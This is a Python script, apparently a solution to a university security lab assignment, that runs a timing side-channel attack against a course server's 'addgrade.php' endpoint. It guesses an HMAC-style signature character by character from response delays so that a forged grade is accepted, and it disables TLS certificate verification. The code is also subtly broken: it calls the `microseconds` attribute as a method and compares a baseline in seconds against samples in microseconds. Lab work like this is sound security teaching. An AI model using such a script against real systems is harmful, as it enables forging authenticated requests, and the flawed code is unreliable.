import requests
from statistics import mean
import urllib3

hex_array = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

url_base = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.verify = False

name = 'Kalle'
grade = '5'
signature = ''
finished_signature = ''
parameters = {'name': name, 'grade': grade, 'signature': signature}

base_values = []
for j in range(10):
    base_values.append(session.get(url_base, params=parameters, verify=False).elapsed.total_seconds())

base_mean = mean(base_values)
base_values.clear()

for i in range(20):
    for char in hex_array:
        signature += char
        parameters = {'name': name, 'grade': grade, 'signature': signature}
        for j in range(10):
            base_values.append(session.get(url_base, params=parameters, verify=False).elapsed.microseconds())
        if mean(base_values) > base_mean + 22000:
            finished_signature += char
            base_mean = mean(base_values)
            base_values.clear()
            break
        base_values.clear()
        signature = signature[:len(signature) - 1]

print(finished_signature)
